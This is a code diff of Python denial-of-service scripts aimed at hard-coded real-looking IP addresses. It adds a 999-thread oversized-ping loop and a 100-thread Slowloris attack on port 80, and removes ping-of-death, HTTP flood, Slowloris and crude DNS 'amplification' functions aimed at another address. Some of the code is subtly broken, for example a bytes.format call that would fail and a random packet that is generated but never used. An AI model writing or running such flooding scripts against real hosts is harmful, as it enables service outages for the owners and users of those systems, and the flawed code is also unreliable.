@@ -1,84 +1,69 @@
+import os
+import time
+import threading
+
+def attack():  
+    target_ip = "13.232.128.212"
+
+    packet_size = 80000
+
+    packet = os.urandom(packet_size)
+
+    os.system(f"ping -c 1 -s {packet_size} {target_ip}")
+
+    print(f"Sent a large ICMP echo request packet ({packet_size} bytes) to {target_ip}")
+
+def main():
+    num_threads = 999  
+
+    while True:
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=attack)
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
+
+        print("Threads finished, restarting...")
+
+if __name__ == "__main__":
+    main()
+
+
 import socket
 import threading
 import time
-import random
-import string
-from scapy.all import *
 
-# Target IP and port
-target_ip = "54.159.179.237"
-http_port = 80
-dns_port = 53
+# Configuration  # Replace with the target IP address
+target_ip = "13.232.128.212"
+target_port = 80  # Replace with the target port
 
-# Ping of Death
-def ping_of_death():
+def slowloris_attack():
     while True:
-        ip = IP(dst=target_ip)
-        icmp = ICMP()
-        raw = Raw(b'X'*65500)
-        packet = ip / icmp / raw
-        send(fragment(packet), verbose=0)
-        time.sleep(1)
-
-# HTTP Flood
-def http_flood():
-    while True:
-        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            http_conn.connect((target_ip, http_port))
-            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\n\n").encode()
-            http_conn.send(data)
-        except socket.error:
-            print("No connection")
-        finally:
-            http_conn.shutdown(socket.SHUT_RDWR)
-            http_conn.close()
-        time.sleep(1)
-
-# Slowloris
-def slowloris():
-    while True:
-        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            http_conn.connect((target_ip, http_port))
-            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\r\n").encode()
-            http_conn.send(data)
-            for i in range(9999):
-                data = random.choice(string.ascii_letters + string.digits)
-                data = "X-{}: {}\r\n".format(i, data).encode()
-                http_conn.send(data)
-                time.sleep(random.uniform(0.1, 3))
-            http_conn.close()
-        except KeyboardInterrupt:
-            print("\nExiting...")
-            break
+            # Create a new socket connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((target_ip, target_port))
+            # Send partial HTTP requests
+            s.send(b"GET / HTTP/1.1\r\n")
+            s.send(b"Host: {}\r\n".format(target_ip).encode())
+            # Keep the connection open
+            while True:
+                s.send(b"X-a: {}\r\n".format('a' * 1000).encode())
         except Exception as e:
-            continue
-        time.sleep(1)
-
-# DNS Amplification
-def dns_amplification():
-    while True:
-        dns_conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            dns_conn.sendto(b"DNS request", (target_ip, dns_port))
-        except socket.error:
-            print("No connection")
+            print(f"Exception: {e}")
         finally:
-            dns_conn.close()
-        time.sleep(1)
+            s.close()
 
-# Create threads for each attack
-threads = []
-threads.append(threading.Thread(target=ping_of_death))
-threads.append(threading.Thread(target=http_flood))
-threads.append(threading.Thread(target=slowloris))
-threads.append(threading.Thread(target=dns_amplification))
+def main():
+    threads = [threading.Thread(target=slowloris_attack) for _ in range(100)]
+    for thread in threads:
+        thread.start()
+    for thread in threads:
+        thread.join()
 
-# Start threads
-for t in threads:
-    t.start()
-
-# Run indefinitely
-while True:
-    pass
+if __name__ == "__main__":
+    main()
